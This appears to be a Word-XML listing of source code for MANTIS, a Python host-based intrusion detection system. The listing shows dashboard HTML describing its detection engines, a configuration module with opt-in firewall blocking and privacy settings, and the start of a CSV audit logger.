    <w:p w14:paraId="66DE0D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total seen &lt;b id="pktTotal" style="color:var(--text-main)"&gt;0&lt;/b&gt;&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCBB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75623C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id="pktScroll" style="max-height: 55vh; overflow-y: auto;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54CAD9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&lt;table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FA8B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&lt;thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD067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&lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48197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width="5%"&gt;No.&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148EB0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width="12%"&gt;Time&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410D01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width="15%"&gt;Source&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFCEC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width="15%"&gt;Destination&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4400F0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width="8%"&gt;Protocol&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73288A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 width="8%"&gt;Length&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75682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&lt;th&gt;Info&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38980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&lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B575D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&lt;/thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BD0E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&lt;tbody id="wsTableBody" style="background: #0f172a;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE1ED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&lt;tr&gt;&lt;td colspan="7" class="empty-state"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325AD5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&lt;strong&gt;Waiting for captured traffic&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CB15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&lt;span&gt;Packets matching the current filter will appear here.&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470BE6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&lt;/td&gt;&lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9DE1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&lt;/tbody&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DD02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&lt;/table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBEC9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684DBF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09C8113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49D8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class="table-card" id="pktDetailCard" style="margin-top:16px; display:none;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF53F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class="table-header"&gt;Packet detail &lt;span class="table-kicker"&gt;Raw hexadecimal and ASCII representation&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D99D4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&lt;pre id="pktDetail" class="hexdump"&gt;&lt;/pre&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418592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3C4BF3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48D275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 &lt;!-- End of tab-packets --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE7E4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2A3F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&lt;!-- TAB 3: ALERTS &amp; BLACKLIST --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE0B1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id="tab-alerts" class="tab-content" role="tabpanel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091073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class="content-width"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5735C5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class="page-intro"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44DBFD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&lt;h2&gt;Threat activity log&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468D00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&lt;p&gt;Review detected events, severity classifications, source hosts, risk scores and the corresponding MITRE ATT&amp;amp;CK technique where available.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A52E4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491A5C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class="table-card"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1348E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class="table-header table-header-split"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F37C0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&lt;div&gt;All alerts&lt;span class="table-kicker"&gt;Up to 100 recent events held in memory&lt;/span&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D052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&lt;span class="refresh-note"&gt;LIVE&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B006C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5A40C0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class="table-scroll" style="max-height: 600px;"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012E3C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&lt;table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D66B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&lt;thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF386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&lt;tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326C49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&lt;th&gt;Sev&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4B59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&lt;th&gt;Time&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A568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              &lt;th&gt;Sensor &amp;larr; Source&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA00E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&lt;th&gt;ATT&amp;amp;CK&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336C14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&lt;th&gt;Risk&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544CA7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&lt;th&gt;Message Log&lt;/th&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC97D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&lt;/tr&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BDE8A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&lt;/thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436CB0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&lt;tbody id="fullAlertTableBody"&gt;&lt;/tbody&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCB23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&lt;/table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2C04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62AE7D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5B07FA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5C2BBD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 &lt;!-- End of tab-alerts --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15171C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A40E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&lt;!-- TAB 4: ARCHITECTURE --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACB69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&lt;div id="tab-architecture" class="tab-content" role="tabpanel"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4895B3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class="content-width"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321447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&lt;div class="doc-view"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F14AC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&lt;h2&gt;MANTIS system design&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6734B4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class="project-summary"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C06B9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&lt;strong&gt;Minimalist Alert Network for Threat Intelligence System&lt;/strong&gt; is a host-based intrusion detection platform implemented with the Python standard library.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FB29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36851C1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930C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&lt;h3&gt;Design objective&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434302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&lt;p&gt;MANTIS investigates whether common threat-detection methods can be implemented from first principles with no third-party runtime packages. The sensor captures frames at OSI Layer 2 through Linux AF_PACKET sockets, extracts network features and passes them through four focused detection engines.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC1F5E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038F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&lt;h3&gt;Detection pipeline&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB794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&lt;div class="architecture-grid"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBAB1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class="arch-engine"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="312BB0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 class="method-tag"&gt;Statistical analysis&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74110F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&lt;strong&gt;Traffic anomaly detection&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9314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Measures packet rate against a running mean and standard deviation. Sustained observations above the configured threshold identify possible volumetric DDoS traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9866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578FF98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63C2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class="arch-engine"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132C4C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 class="method-tag"&gt;Behavioural analysis&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258A64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&lt;strong&gt;Port-scan detection&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493121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Uses custom K-Nearest Neighbours and K-Means implementations to classify unusual port-access patterns associated with horizontal and vertical reconnaissance.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE4FC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77BE60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7984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class="arch-engine"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E133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 class="method-tag"&gt;Payload classification&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7A20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&lt;strong&gt;Application-layer inspection&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5041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Applies a Naive Bayes classifier to captured payload features to identify patterns associated with SQL injection and cross-site scripting attempts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F689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5CFAB42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DD5C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&lt;div class="arch-engine"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F265D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&lt;span class="method-tag"&gt;Reputation lookup&lt;/span&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCF7D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&lt;strong&gt;Known malicious hosts&lt;/strong&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C1242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Uses a memory-efficient Bloom filter to test source addresses against a configured blacklist before the remaining analysis is completed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="039B91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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021CEE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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFC09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048F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&lt;h3&gt;Response and reporting&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240F52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&lt;p&gt;Each detection is assigned a severity and risk score, enriched with MITRE ATT&amp;amp;CK metadata where applicable, then forwarded to the local SIEM interface. If active defence is explicitly enabled, high-confidence detections can be passed to the host firewall for blocking.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD6E3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20F561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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BB05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&lt;/div&gt; &lt;!-- End of tab-architecture --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DF82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920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&lt;/div&gt; &lt;!-- End of main-content --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5D2F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&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEDF3B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AB59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&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A56D2D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Utilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395A4B43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src/utils/config.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5806231A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(153 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7D8D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31AAB8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"""Central runtime configuration for MANTIS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D658B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9DB1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Implements NFR-3, which requires that active firewall blocking remains</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBE0B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"strictly opt-in via configuration flags", and NFR-4/NFR-7 which require a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D8D7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single configurable entry point that is portable across hosts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC9690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CF6E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Every tunable that used to be a magic number inside an engine or the sensor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE0B4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is declared here, so a marker can see (and change) the detection thresholds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79758F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without reading the source. Settings resolve in this order, later wins:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0F61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2F19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1. defaults below</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE5AD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2. JSON file  (--config mantis.conf.json)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4234BB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3. environment variables (MANTIS_*)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1C61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4. command line flags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D64D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6C44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0B84DD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032A5D3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47C2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5B0084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3DE07B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E7BEE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943E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Config:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122201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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8EBB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capture ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B8C9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self.interface = "any"          # informational; AF_PACKET binds all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770773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self.packet_buffer = 5000       # in-memory ring buffer size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73ED01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self.queue_size = 100000        # sniffer -&gt; analyzer bounded queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66597C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1CBE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engine thresholds (were hard-coded before) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73CB67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self.zscore_window = 30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5E1B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self.zscore_threshold = 3.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E53DC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self.ddos_min_pps = 500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72333A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self.ddos_consecutive_intervals = 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324C1C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self.knn_k = 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D007F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self.kmeans_k = 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07172C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self.kmeans_alpha = 0.05</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F236F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self.payload_confidence = 0.80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D68B9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self.alert_dedup_seconds = 5.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259CFF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Interval detections may only name/block a source when one address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1301D6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accounts for at least this share of the observed packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488D89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self.source_attribution_min_share = 0.50</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E82B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E57C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NFR-3: active defence is OPT-IN, never on by default ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DC1A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self.block_enabled = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F0D7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self.block_whitelist = ["127.0.0.1", "0.0.0.0"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F8046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which engines are allowed to trigger a firewall drop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4724C4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self.block_on = ["payload", "blacklist", "ddos", "scan"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6883F51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5E06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NFR-3 / GDPR + DPA 2018 ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171C63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self.payload_excerpt_bytes = 64   # truncate stored payload excerpts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="372488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self.privacy_mode = True          # redact PII + anonymise IPs in logs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA47D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self.anonymise_ips = False        # mask last octet in persisted logs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3462115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401E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telemetry ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CEDF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self.udp_host = "127.0.0.1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3262E8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self.udp_port = 9999</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177DA2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self.http_port = 8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D8B6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9EE77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threat intelligence ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6BDF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self.blacklist_file = None        # newline separated IP feed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0169A4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self.bloom_size = 1000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE2AB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self.bloom_hashes = 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED92A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4465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--- forensics ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="470846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self.pcap_file = None             # if set, write a live libpcap capture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237985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self.pcap_snaplen = 96            # headers only by default (privacy)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0808B5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1970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self.brain_file = "data/mantis_brain.json"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5800C3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self.log_file = "mantis_logs.csv"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3056B28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0C7F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---- loading -------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7C69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load_file(self, path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EE7D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path or not os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32530E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37687E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open(path, "r", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED4CB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 = json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A1D8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self.update(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500D36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config loaded from %s" % path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EFA9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7641DD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E9F3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load_env(self, environ=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4527C6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"""Read MANTIS_* environment variables (MANTIS_BLOCK_ENABLED=1)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2203C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environ = environ if environ is not None else os.environ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0723ED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 in vars(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08533D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env_key = "MANTIS_" + key.upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6B16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env_key in environ:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334B9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self._set_coerced(key, environ[env_key])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75DC70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CE01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update(self, data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2469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isinstance(data, dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FAB5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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1CA6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key, value in data.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C21E0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hasattr(self, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AAD87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value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2AA7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7324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_set_coerced(self, key, raw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D511C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"""Coerce a string (env var / CLI) to the type of the default."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB626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current = getattr(self, key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E1C0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70A268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isinstance(current, bool):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A148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str(raw).strip().lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435645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in ("1", "true", "yes", "on"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA8FE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isinstance(current, int):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7144F4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int(raw))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5C9C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isinstance(current, float):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F021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float(raw))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3A55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elif isinstance(current, list):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F770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[p.strip() for p in str(raw).split(",")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9EE8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if p.strip()])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4B0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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318159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raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5A47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(TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048214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ignoring bad config value for %s: %r" % (key, raw))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D56DB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35CD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apply_args(self, args):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23183D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"""Apply parsed argparse values (None means 'not supplied')."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7404C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key, value in vars(args).items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764CD7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value is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF09E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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360524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hasattr(self, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E6381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setattr(self, key, value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6668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CFA4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as_dict(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EC00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dict(vars(self))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD9D93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6F48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summary(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D35C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"""Short human-readable banner used at sensor start-up."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534894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"\n".join([</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226F53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interface        : %s" % self.interface,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D5C3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packet buffer    : %d packets (in-memory)" % self.packet_buffer,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABCD8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z-score / DDoS   : window=%d threshold=%.1f min_pps=%d "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C61C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"consecutive=%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60486E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(self.zscore_window, self.zscore_threshold, self.ddos_min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C9AB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self.ddos_consecutive_intervals),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D094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knn / kmeans     : k=%d / k=%d alpha=%.2f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E22D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(self.knn_k, self.kmeans_k, self.kmeans_alpha),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEF68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source attribution: minimum %.0f%% dominant traffic share"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8B34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% (self.source_attribution_min_share * 100),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6A0A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active defence   : %s%s" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0828C2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"ENABLED" if self.block_enabled else "disabled (opt-in)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC9DD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(" on " + ",".join(self.block_on)) if self.block_enabled else ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4152B3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privacy mode     : %s (payload excerpt %d bytes)" % (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB9FB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"on" if self.privacy_mode else "off",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E57E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self.payload_excerpt_bytes),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7038CB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pcap capture     : %s" % (self.pcap_file or "off"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDBFB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  threat intel     : %s" % (self.blacklist_file or "built-in seed"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B485B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])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E4BF9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9608E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E036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module-level singleton shared by every component</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="599F2E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CONFIG = Config()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB829F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src/utils/logger.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162F652B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(167 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3348D4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csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFCB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784EF0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076B7C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419871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103C57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75F7666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208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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E041D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import utils.mitre as mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDE28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import utils.privacy as privacy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCC06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except ImportError:  # direct execution from inside utils/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3009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import mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F1FC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import privacy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6957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4C3D6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DB75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FR-4 requires the audit trail to record "timestamps, source IP addresses,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1949B3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engine identifiers, threat verdicts, confidence scores, and payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B684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excerpts", not just a free-text line. These are the resulting columns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A722C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CSV_COLUMNS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791589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"Timestamp",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3C3A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"Source IP",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038E88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"Engine",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1F72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"Verdict",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677C5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"Severity",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285D4A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"Risk Score",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFC01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"Confidence",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D61C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"ATT&amp;CK Technique",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C1242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"ATT&amp;CK Tactic",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038D73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"Payload Excerpt",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64876C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"Message",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5729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]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD18BD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ED869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5091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Logger:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E48B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"""Append-only CSV audit log.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FCB5F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1B3D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Writes are serialised through a threading.Lock because the sensor's</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4812C0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analyzer thread and the main reporting loop can both emit an alert; without</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12756A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it two interleaved csv.writer calls can produce a torn row and corrupt the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9149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evidence file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BD633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949C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Everything persisted here passes through utils.privacy first, so the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D564A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64-byte excerpt limit and PII redaction required by NFR-3 are enforced at</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7279E4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point of writing rather than left to each caller.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4939E6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D4C90F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6162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filename="mantis_logs.csv", config=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C100A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self.filename = filename</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5E94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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7B7A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self._lock = threading.Lock()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150A36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self.rows_written = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D15B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B4B9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(Re)create the header when the file is absent or was left empty.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2D17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needs_header = (not os.path.exists(self.filename)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F2E2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or os.path.getsize(self.filename) == 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F881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needs_header:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257CB4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open(self.filename, "w", newline="", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C155E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csv.writer(f).writerow(CSV_COLUMNS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE94C0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166C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log_alert(self, message, src_ip=None, engine=None, confidence=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E532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payload=None, verdict=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261D51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"""Record one alert, enriched with ATT&amp;CK context and risk score."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DCD93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 = mitre.enrich(message, confidence)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A8AD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27D3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limit = getattr(self.config, "payload_excerpt_bytes", 64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE1E5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privacy_mode = getattr(self.config, "privacy_mode", True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2580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anonymise = getattr(self.config, "anonymise_ips", False)</w:t>
      </w:r>
    </w:p>
